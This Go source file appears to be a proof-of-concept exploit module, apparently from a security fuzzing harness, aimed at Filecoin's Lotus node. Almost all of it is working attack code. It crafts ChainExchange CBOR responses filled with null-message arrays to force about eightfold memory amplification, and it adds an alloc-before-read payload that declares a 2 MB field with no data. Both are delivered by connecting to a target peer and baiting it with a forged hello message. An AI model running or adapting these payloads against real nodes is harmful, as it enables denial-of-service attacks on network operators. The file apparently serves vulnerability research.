package main

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log"
	"time"

	"github.com/ipfs/go-cid"
	"github.com/libp2p/go-libp2p/core/network"
	cbg "github.com/whyrusleeping/cbor-gen"
)

// ---------------------------------------------------------------------------
// Chain Exchange CBOR Memory Amplification (PoC 005)
//
// Exploits 8x wire-to-heap amplification in Lotus CBOR deserialization.
// Constructs ChainExchange Responses where message arrays are filled with
// CBOR null (0xF6, 1 byte) which costs 8 bytes per nil pointer in the
// pre-allocated slice. Stays within Lotus's per-field limit of 150,000.
//
// The handler reads the victim's request and matches the Length field so
// processResponse's len(Chain) check passes. Each tipset contributes
// 150k*2*8 = 2.4 MB heap from ~300 KB wire. The victim's own request
// size determines the amplification magnitude.
//
// Affected code (Lotus):
//   chain/exchange/cbor_gen.go:425  — make([]*Message, 150000) before iteration
//   chain/exchange/cbor_gen.go:511  — make([]*SignedMessage, 150000) before iteration
//   chain/exchange/client.go:473    — no validation before deserialization
// ---------------------------------------------------------------------------

const nullMsgsPerArray = 150000 // max allowed by cbor_gen.go

func getAllAmplificationAttacks() []namedAttack {
	return []namedAttack{
		{
			name:       "exchange/lotus-cbor-memory-amplification-adaptive",
			targetedFn: func(t TargetNode) { runAdaptiveAmplificationAttack(ctx, t) },
			targetType: nodeLotus,
		},
		{
			name:       "exchange/lotus-cbor-alloc-before-read",
			targetedFn: func(t TargetNode) { runAllocBeforeReadAttack(ctx, t) },
			targetType: nodeLotus,
		},
	}
}

// buildAmplificationResponse constructs a ChainExchange Response with the
// given number of tipsets, each containing null-filled message arrays.
// Block headers use the provided CBOR bytes (must be valid for the first
// tipset to pass processResponse's nil-block check).
func buildAmplificationResponse(numTipsets int, blockHeaderCBOR []byte) []byte {
	var buf bytes.Buffer
	buf.Grow(numTipsets*(nullMsgsPerArray*2+len(blockHeaderCBOR)+30) + 20)

	// Response: array(3) [status=0, errorMsg="", chain]
	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 3)
	cbg.WriteMajorTypeHeader(&buf, cbg.MajUnsignedInt, 0)
	cbg.WriteMajorTypeHeader(&buf, cbg.MajTextString, 0)
	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, uint64(numTipsets))

	// Pre-build null block for bulk writes
	nulls := make([]byte, nullMsgsPerArray)
	for i := range nulls {
		nulls[i] = 0xf6
	}

	for i := 0; i < numTipsets; i++ {
		// BSTipSet: array(2) [blocks, messages]
		cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 2)

		// Blocks: array(1) [blockHeader] — real header so processResponse doesn't reject nil
		cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 1)
		buf.Write(blockHeaderCBOR)

		// CompactedMessages: array(4)
		cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 4)

		// Bls: 150k nulls → make([]*Message, 150000) = 1.2 MB heap
		cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, uint64(nullMsgsPerArray))
		buf.Write(nulls)

		// BlsIncludes: [[]] for 1 block
		cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 1)
		cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 0)

		// Secpk: 150k nulls → make([]*SignedMessage, 150000) = 1.2 MB heap
		cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, uint64(nullMsgsPerArray))
		buf.Write(nulls)

		// SecpkIncludes: [[]] for 1 block
		cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 1)
		cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 0)
	}

	return buf.Bytes()
}

// parseRequestLength extracts the Length uint64 from a ChainExchange request.
// Request: [Head []CID, Length uint64, Options uint64]
// Returns 1 on parse error.
func parseRequestLength(data []byte) uint64 {
	if len(data) < 2 {
		return 1
	}
	r := bytes.NewReader(data)

	// Array header (3 elements)
	maj, _, err := cbg.CborReadHeader(r)
	if err != nil || maj != cbg.MajArray {
		return 1
	}

	// Skip Head: array of CIDs
	maj, nCIDs, err := cbg.CborReadHeader(r)
	if err != nil || maj != cbg.MajArray {
		return 1
	}
	for i := uint64(0); i < nCIDs; i++ {
		maj, _, err := cbg.CborReadHeader(r)
		if err != nil {
			return 1
		}
		if maj == cbg.MajTag {
			maj, bsLen, err := cbg.CborReadHeader(r)
			if err != nil || maj != cbg.MajByteString {
				return 1
			}
			r.Seek(int64(bsLen), 1)
		}
	}

	// Read Length
	maj, length, err := cbg.CborReadHeader(r)
	if err != nil || maj != cbg.MajUnsignedInt {
		return 1
	}
	if length == 0 {
		return 1
	}
	// Cap at something reasonable to avoid allocating huge payloads in the fuzzer
	if length > 500 {
		length = 500
	}
	return length
}

// runAdaptiveAmplificationAttack serves an amplification payload that matches
// the victim's request Length. The handler reads the ChainExchange request,
// extracts Length, and builds a response with exactly that many tipsets — each
// stuffed with 150k null messages.
//
// For FetchTipSet (Length=1): 1 tipset × 300k nulls = ~300 KB wire → ~2.4 MB heap (8x)
// For collectChain (Length=500): 500 tipsets × 300k nulls = ~143 MB wire → ~1.14 GB heap (8x)
func runAdaptiveAmplificationAttack(ctx context.Context, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		debugLog("[amplification] cannot fetch chain head for %s, skipping", target.Name)
		return
	}

	// Build a valid-looking block header for the response
	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	})
	triggerCID := blockCIDFromCBOR(blockCBOR)

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[amplification] create host failed: %v", err)
		return
	}
	defer h.Close()

	served := make(chan struct{}, 1)

	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()

		// Read the request to extract Length
		reqBuf := make([]byte, 64*1024)
		n, _ := io.ReadAtLeast(s, reqBuf, 1)
		reqLength := uint64(1)
		if n > 0 {
			reqLength = parseRequestLength(reqBuf[:n])
		}

		// Build response matching the request's Length
		resp := buildAmplificationResponse(int(reqLength), blockCBOR)
		wireSize := len(resp)
		heapEst := int(reqLength) * 2 * nullMsgsPerArray * 8

		s.Write(resp)

		log.Printf("[amplification] served %d tipsets to %s: wire=%s -> est_heap=%s (8x)",
			reqLength, target.Name, humanSize(wireSize), humanSize(heapEst))

		select {
		case served <- struct{}{}:
		default:
		}
	})

	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, connCancel := context.WithTimeout(ctx, 10*time.Second)
	defer connCancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[amplification] connect to %s failed: %v", target.Name, err)
		return
	}

	genesis := parseGenesisCID()
	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
		[]cid.Cid{triggerCID}, headInfo.Height+1, 999999999, genesis,
	))

	select {
	case <-served:
		// logged inside handler
	case <-time.After(30 * time.Second):
		debugLog("[amplification] timeout waiting for %s to fetch", target.Name)
	}
}

// buildAllocBeforeReadPayload constructs a ChainExchange Response containing
// a single message with a 2 MB Params declaration but no actual data.
func buildAllocBeforeReadPayload() []byte {
	var buf bytes.Buffer

	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 3)
	cbg.WriteMajorTypeHeader(&buf, cbg.MajUnsignedInt, 0)
	cbg.WriteMajorTypeHeader(&buf, cbg.MajTextString, 0)
	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 1)

	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 2)
	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 1)
	buf.WriteByte(0xf6)

	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 4)

	const blsCount = 100001
	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, blsCount)
	for i := 0; i < 100000; i++ {
		buf.WriteByte(0xf6)
	}

	validAddr := cborBytes([]byte{0x00, 0x01})
	buf.Write(cborArray(
		cborUint64(0), validAddr, validAddr, cborUint64(0),
		cborBytes([]byte{}), cborUint64(0), cborBytes([]byte{}), cborBytes([]byte{}),
		cborUint64(0), cborBytesWithFakeLength(2097152, nil),
	))

	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 0)
	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 0)
	cbg.WriteMajorTypeHeader(&buf, cbg.MajArray, 0)

	return buf.Bytes()
}

// runAllocBeforeReadAttack delivers a payload that triggers make([]byte, 2MB)
// from a 5-byte CBOR header before io.ReadFull verifies data exists.
func runAllocBeforeReadAttack(ctx context.Context, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		debugLog("[alloc-before-read] cannot fetch chain head for %s, skipping", target.Name)
		return
	}

	payload := buildAllocBeforeReadPayload()
	log.Printf("[alloc-before-read] built payload: wire=%s (100k nulls + 2MB Params declaration)",
		humanSize(len(payload)))

	triggerBlock := buildBlockHeaderCBOR(blockHeaderOpts{
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	})

	runGenericExchangeServerAttack(ctx, target, "alloc-before-read", payload, triggerBlock)
}

func humanSize(b int) string {
	switch {
	case b >= 1<<30:
		return fmt.Sprintf("%.1f GB", float64(b)/float64(1<<30))
	case b >= 1<<20:
		return fmt.Sprintf("%.1f MB", float64(b)/float64(1<<20))
	case b >= 1<<10:
		return fmt.Sprintf("%.1f KB", float64(b)/float64(1<<10))
	default:
		return fmt.Sprintf("%d B", b)
	}
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}
